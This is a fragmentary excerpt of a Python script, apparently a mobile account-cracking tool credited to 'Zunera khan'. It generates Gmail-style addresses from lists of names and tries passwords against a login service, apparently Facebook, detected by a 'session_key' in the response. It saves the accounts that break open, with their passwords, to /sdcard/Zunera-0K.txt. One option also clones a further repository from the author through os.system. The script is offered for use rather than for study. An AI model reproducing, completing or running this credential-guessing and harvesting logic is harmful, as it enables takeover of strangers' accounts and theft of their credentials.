...
\033[1;32m=================================
\033[1;32m Owner  : Zunera khan :/
\033[1;33m GitHub : Zunera10 :/
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Zunera10/FILE')
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Zunera','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Zunera','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Zunera', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/Zunera-0K.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mZunera-0K\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Zunera-0K.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
